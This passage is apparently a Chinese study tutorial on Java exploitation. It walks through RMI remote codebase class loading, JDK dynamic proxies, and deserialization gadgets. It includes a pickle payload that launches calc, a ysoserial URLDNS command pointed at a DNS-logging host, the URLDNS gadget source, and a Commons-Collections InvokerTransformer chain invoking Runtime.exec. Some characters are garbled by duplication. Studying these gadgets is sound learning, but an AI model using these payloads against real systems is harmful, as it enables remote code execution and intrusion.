import java.rmi.server.UnicastRemoteObject;
public class Calc extends UnicastRemoteObject implements ICalc {
    public Calc() throws RemoteException {}
    public Integer sum(List<Integer> params) throws RemoteException {
      Integer sum = 0;
      for (Integer param : params) {
        sum += param;
     }
      return sum;
   }
}
~~~

RemoteRMIServer.java

~~~java
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;
import java.util.List;
public class RemoteRMIServer {
  private void start() throws Exception {
    if (System.getSecurityManager() == null) {
      System.out.println("setup SecurityManager");
      System.setSecurityManager(new SecurityManager());
   }
    Calc h = new Calc();
    LocateRegistry.createRegistry(1099);
    Naming.rebind("refObj", h);
 }
  public static void main(String[] args) throws Exception {
    new RemoteRMIServer().start();
 }
}
~~~

client.policy

~~~java
grant {
  permission java.security.AllPermission;
};
~~~



~~~java
javac *.java
java -Djava.rmi.server.hostname=127.0.0.1 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer
~~~

其中， java.rmi.server.hostname 是服务器的IP地址，远程调用时需要根据这个值来访问RMIServer。

RMIClient.java

~~~java
import java.rmi.Naming;
import java.util.List;
import java.util.ArrayList;
import java.io.Serializable;
public class RMIClient implements Serializable {
  public class Payload extends ArrayList<Integer> {}
  public void lookup() throws Exception {
    ICalc r = (ICalc)
Naming.lookup("rmi://192.168.135.142:1099/refObj");
    List<Integer> li = new Payload();
    li.add(3);
    li.add(4);
    System.out.println(r.sum(li));
 }
  public static void main(String[] args) throws Exception {
    new RMIClient().lookup();
 }
}
~~~

这个Client我们需要在另一个位置运行，因为我们需要让RMI Server在本地CLASSPATH里找不到类，才会去加载codebase中的类，所以不能将RMIClient.java放在RMI Server所在的目录中。运行RMIClient：

~~~java
java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient
~~~

我们只需要编译一个恶意类，将其class文件放置在Web服务器的 /RMIClient$Payload.class 即可

条件较苛刻

我们通过对发送RMI数据进行发包发现，有2个TCP连接：

~~~
1. 本机与RMI Registry的通信（在我的数据包中是1099端口）
2. 本机与RMI Server的通信（在我的数据包中是64000端口）
~~~

复制Wireshark识别出的 Java Serialization 数据段，使用SerializationDumper进行解密，序列化后的内容经过解密是类似BNF（巴科斯范式）

这一整个序列化对象，其实描述的就是一个字符串，其值是 refObj 。意思是获取远程的 refObj 对象。

我们的 codebase 是通过 [Ljava.rmi.server.ObjID; 的 classAnnotations 传递的，即使我们没有RMI的客户端，只需要修改 classAnnotations 的值，就能控制codebase，使其指向攻击者的恶意网站。

在序列化Java类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/181173/22/39026/37224/652399bcF5a3420c4/774180d05b334bca.jpg)
![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/191811/18/39500/45622/652399dbF0c53ef87/61e9586b684371f5.jpg)

所以，我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的内容。







### 3.java动态代理机制

Java的自带jdk动态代理机制，位于java.lang.reflect.proxy包中，其本质实现是通过反射执行invoke方法来动态获取执行方法。

代理模式Java当中最常用的设计模式之一。其特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。而Java的代理机制分为静态代理和动态代理，而这里我们主要重点学习java自带的jdk动态代理机制。

![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/132640/10/38823/14321/65238275F07867b2f/101319a554f2b7b0.jpg)

#### 静态代理

定义一个接口

~~~java
public interface Rental {
    public void sale();
}
~~~

委托类，实现接口的方法

~~~java
public class Entrust implements Rental{
    @Override
    public void sale() {
        System.out.println("出租房子");
    }
}
~~~

代理类

~~~java
public class AgentRental implements Rental{
    private Rental target; // 被代理对象
    public AgentRental(Rental target) {
        this.target = target;
    }
    @Override
    public void sale() {
        System.out.println("房子出租价位有1k-3k"); // 增加新的操作
        target.sale(); // 调用Entrust委托类的sale方法
    }
}
~~~

测试类，生成委托类实例对象，并将该对象传入代理类构造函数中。

~~~java
public class Test {
    // 静态代理使用示例
    public static void consumer(Rental subject) {
        subject.sale();
    }
    public static void main(String[] args) {
        Rental test = new Entrust();
        System.out.println("---使用代理之前---");
        consumer(test);
        System.out.println("---使用代理之后---");
        consumer(new AgentRental(test));
    }
}
~~~

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/181360/10/39135/40159/65238368F337dd5e4/a79570a8a607e892.jpg)

我们这里定义了，接口，委托类，代理类，测试类

我们可以在不改变Entrust委托类源代码的情况下 ,通过AgentRental代理类来修改Entrust委托类的功能，从而实现“代理”操作。在进行代理后，自定义说明房子出租价位有1k-3k的操作方法。

![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/117779/7/42206/28905/652384faF9e2e8e59/a11b0eab4c8632dc.jpg)

当我们的接口类需要增加和删除方式的时候，委托类和代理类都需要更改，不容易维护，同时如果需要代理多个类的时候，每个委托类都要编写一个代理类，会导致代理类繁多，不好管理

#### 动态代理

Java动态代理位于Java.lang.reflect包下，我们一般就仅涉及Java.lang.reflect.Proxy类与InvocationHandler接口,使用其配合反射，完成实现动态代理的操作。

还是上面那个代理，新增代理类TestAgent

~~~java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
public class TestAgent implements InvocationHandler {
    // target变量为委托类对象
    private Object target;
    public TestAgent(Object target) {
        this.target = target;
    }
    // 实现 java.lang.reflect.InvocationHandler.invoke()方法
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        // 添加自定义的委托逻辑
        System.out.println("房子出租价位有1k-3k");
        // 调用委托类的方法
        Object result = method.invoke(target,args);
        return result;
    }
}
~~~

设置测试类

~~~java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
public class test {
    public static void main(String[] args) {
        // 获取委托类的实例对象
        Entrust testEntrust = new Entrust();
        // 获取CLassLoader
        ClassLoader classLoader = testEntrust .getClass().getClassLoader();
        // 获取所有接口
        Class[] interfaces = testEntrust .getClass().getInterfaces();
        // 获取一个调用处理器
        InvocationHandler invocationHandler = new TestAgent(testEntrust);
        // 查看生成的代理类
        System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles","true");
        // 创建代理对象
        Rental proxy = (Rental) Proxy.newProxyInstance(classLoader,interfaces,invocationHandler);
        // 调用代理对象的sayHello()方法
        proxy.sale();
    }
}
~~~

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/166947/32/41393/56731/652385f9F53866268/f60c562651c993ca.jpg)

在`com/sun/proxy/$Proxy0.class`下查看

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/189752/23/40242/48069/652386fcFe232a038/1607fde76054f1c8.jpg)

动态代理就是通过反射去调用的

### 4.反序列化

区别python，php，java，dotnet这四种的反序列化

python的pickle反序列化时会直接代码执行

~~~python
import pickle
s = b'\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x94.'
haha = pickle.loads(s)
~~~

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/120324/40/41233/42167/6524a3a8F81b63c29/1bc62ecc87f57f53.jpg)

java的readobject，在我们重写了readobject方法时，序列化后再进行反序列化会代码执行，下面的代码中，我们重写了readObject方法，在s.defaultReadObject()后还增加了输出message，这就是代码执行

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/159327/26/39781/17043/6524a3ddFc110a687/1fc8c213961ce237.jpg)

php的则不会

dotnet的也不会

#### 基础

java的反序列化要区别于php的反序列化，演示如下，先新建一个Person类，然后对这个Person类的实例化对象序列化

SerializationExample.java

~~~java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class SerializationExample {
    public static void main(String[] args) {
        // 创建要序列化的对象
        Person obj = new Person("batmanfuture", 22);

        try {
            // 创建文件输出流
            FileOutputStream fileOut = new FileOutputStream("raw-input-file.bin");

            // 创建对象输出流
            ObjectOutputStream out = new ObjectOutputStream(fileOut);

            // 将对象进行序列化并写入文件
            out.writeObject(obj);

            // 关闭输出流
            out.close();

            System.out.println("Object serialized successfully.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

Person.java

~~~java
import java.io.IOException;
public class Person implements java.io.Serializable {
    public String name;
    public int age;
    Person(String name, int age) {
        this.name = name;
        this.age = age;
    }
    private void writeObject(java.io.ObjectOutputStream s) throws
            IOException {
        s.defaultWriteObject();
        s.writeObject("This is a object");
    }
    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        String message = (String) s.readObject();
        System.out.println(message);
    }
}
~~~

执行之后生成了raw-input-file.bin文件

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/95767/23/26674/51366/65239708F99f675a4/b37bb0f2cde229bf.jpg)

然后执行

~~~
java -jar SerializationDumper-v1.13.jar -r raw-input-file.bin
~~~

![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/181419/11/39435/69430/65239727F43461d79/ce034562f77a9d22.jpg)

~~~java
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 6 - 0x00 06
        Value - Person - 0x506572736f6e
      serialVersionUID - 0x9f 53 99 09 11 2b 2f d5
      newHandle 0x00 7e 00 00
      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE
      fieldCount - 2 - 0x00 02
      Fields
        0:
          Int - I - 0x49
          fieldName
            Length - 3 - 0x00 03
            Value - age - 0x616765
        1:
          Object - L - 0x4c
          fieldName
            Length - 4 - 0x00 04
            Value - name - 0x6e616d65
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      Person
        values
          age
            (int)22 - 0x00 00 00 16
          name
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 12 - 0x00 0c
                Value - batmanfuture - 0x6261746d616e667574757265
        objectAnnotation
          TC_STRING - 0x74
            newHandle 0x00 7e 00 04
            Length - 16 - 0x00 10
            Value - This is a object - 0x546869732069732061206f626a656374
          TC_ENDBLOCKDATA - 0x78
~~~

可以看这个：https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html

然后反序列化

~~~java
import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class DeserializationExample {
    public static void main(String[] args) {
        try {
            // 创建文件输入流
            FileInputStream fileIn = new FileInputStream("raw-input-file.bin");

            // 创建对象输入流
            ObjectInputStream in = new ObjectInputStream(fileIn);

            // 反序列化对象
            Person person = (Person) in.readObject();

            // 输出读取到的对象的属性值
            System.out.println("Name: " + person.name);
            System.out.println("Age: " + person.age);

            // 关闭输入流
            in.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/104075/6/40570/49613/65239babF329f142b/aabeade3222c3f97.jpg)

这个特性就让Java的开发变得非常灵活。比如后面将会讲到的HashMap，其就是将Map中的所有键、值都存储在 objectAnnotation 中，而并不是某个具体属性里。

#### URLDNS

~~~
java -jar ysoserial-all.jar URLDNS http://fl8nw3.ceye.io/ > 123456.ser
~~~

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/218264/9/27365/7146/6523a09bF2d87921f/65388fcacf074c43.jpg)

将生成的代码和java代码放在一起，给出利用代码

~~~java
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class URLDNSExploit {

    public static void main(String[] args) throws IOException, ClassNotFoundException {

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("123456.ser"));

        objectInputStream.readObject();
    }

}
~~~

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/127882/10/39815/41010/6523a0c2Fcf30b109/9d5b000927cb1c72.jpg)
![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/197304/20/37429/38732/6523a0caFd98f4ec4/6feabf9680c4cf3b.jpg)
![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/104512/17/46859/46102/6523a0ceF0eae8127/f436b61d325c76be.jpg)

这里dns就直接探测到了，这里的实战场景就是如果123456.ser这里我们是可以控制的，我们就可以通过这个来判断是否出网，以及漏洞是否存在

现在先分析URLDNS利用链，先看ysoserial是如何生成 URLDNS 的代码的：

##### 为什么会这么构造：

产生安全问题的形式：

入口类的参数中包含可控类，该类有危险方法，或者该类再调用其他有危险方法的类，readoject时调用

满足条件：

1）继承Serializable

2）入口类source（需要重写readObject，jdk自带，参数类型泛化）

3）调用链（gadget chain）

4）执行类sink（ssrf，rce等）

java里的map，hashmap，hashtable符合入口类

继承序列化是为了传输，参数泛化是他本身就是一个键值对

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/192402/19/40142/44345/6524a765Fbf8e62d7/e386105f55786811.jpg)

他这里重写readobject是因为，在hashmap中，由于entry的存放位置是根据key的hash值来计算的，然后存放在数组中，对于同一个key在不同的jvm中计算得到的hash是可能不同的

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/181640/4/39905/59545/6524a78aF366f3fca/e7ab7ac84689b709.jpg)

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/165895/11/41375/88332/6523a16cFb87b59a8/d51625240dc52b46.jpg)

~~~java
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
~~~

看到 URLDNS 类的 getObject方法，ysoserial会调⽤用这个⽅方法获得Payload，这个方法返回的是⼀一个对象，这个对象就是最后将被序列列化的对象，在这里是 HashMap 。

![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/105851/24/38425/57920/6523a3aaF5c8e7fe0/b5f746c124d85d0d.jpg)

找到 HashMap 类的 readObject方法，因为Java开发者（包括Java内置库的开发者）经常会在这⾥里里⾯面写自己的逻辑，所以导致可以构造利利⽤用链。

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/90644/13/40333/62356/6523a477F3b7aed79/6a51274ef695fd6c.jpg)

在这里最后的

~~~java
putVal(hash(key), key, value, false, false);
~~~

是hashCode的计算操作触发了了DNS请求。

我们下载https://github.com/frohoff/ysoserial项目的代码，main函数可以全局搜到，或者在pom.xml中搜mainClass，在ysoserial.GeneratePayload类下

![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/50915/13/25683/74113/6523a762F041a0703/e95f4e71af4815ed.jpg)

调试main方法

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/191775/7/39740/61123/6523a7c2Fd78d8ec7/ab8fbdf036af3574.jpg)

点击之后发现下面会打印usage，因为这会没加任何参数。所以，我们打开编辑配置

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/193196/6/38555/35466/6523a80eFf996d8ed/00e79434f8508c46.jpg)

加上

~~~
URLDNS http://fl8nw3.ceye.io/ > 123456.ser
~~~

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/184805/16/40054/35004/6523a86eF840aa945/402db1b243e9fdc1.jpg)

重复刚才，对main方法调试，在urldns的那个getObject方法处打断点

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/184974/31/38047/40163/6523b150F3f542d82/bfbfc3dac2922cb6.jpg)

在hash方法中，hash方法调⽤用了了key的 hashCode() ⽅方法：

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/10033/15/23201/45455/6523b201F22608430/9e1507bb9b078d08.jpg)

URLDNS 中使用的这个key是⼀一个 java.net.URL 对象，我们看看其 hashCode方法：

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/222244/33/30106/29828/6523b269F4c3182c6/9f4103cc4d406db1.jpg)

此时， handler 是 URLStreamHandler 对象（的某个⼦子类对象），继续跟进其 hashCode方法：

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/96286/33/45135/63643/6523b2e4F51d5db4c/f0894dab5e6eaf2f.jpg)

这⾥里里有调⽤用 getHostAddress方法，继续跟进：

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/115268/20/43610/47383/6523b31eF6d378779/413d41612ea8cc5f.jpg)

这⾥里里 InetAddress.getByName(host) 的作⽤用是根据主机名，获取其IP地址，在网络上其实就是⼀一次
DNS查询。到这里就不不必要再跟了了。

~~~
整个 URLDNS 的Gadget其实清晰⼜又简单：
1. HashMap->readObject()
2. HashMap->hash()
3. URL->hashCode()
4. URLStreamHandler->hashCode()
5. URLStreamHandler->getHostAddress()
6. InetAddress->getByName()
~~~

要构造这个Gadget，只需要初始化⼀一个 java.net.URL 对象，作为 key 放在 java.util.HashMap中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列列化时将会重新计算其 hashCode ，才能触发到后⾯面的DNS请求，否则不不会调⽤用 URL->hashCode() 。



#### CC链（Common-Collections）

##### 简述

示例代码

~~~java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;
public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]
                                {"C:\\Windows\\System32\\calc.exe"}),
        };
        Transformer transformerChain = new
                ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);
        outerMap.put("test", "xxxx");
    }
}
~~~

![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/180351/32/38181/74496/6523b683Fab21a83a/243e069040cc3eae.jpg)

TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可
以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：

~~~java
Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,valueTransformer);
~~~

keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。

我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类。

Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：

~~~java
public interface Transformer {
	public Object transform(Object input);
}
~~~

TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个”回调
函数“，这个回调的参数是原始对象。

##### ConstantTransformer

ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个
对象，并在transform⽅法将这个对象再返回：

~~~java
public ConstantTransformer(Object constantToReturn) {
	super();
iConstant = constantToReturn;
}
public Object transform(Object input) {
	return iConstant;
}
~~~

所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。































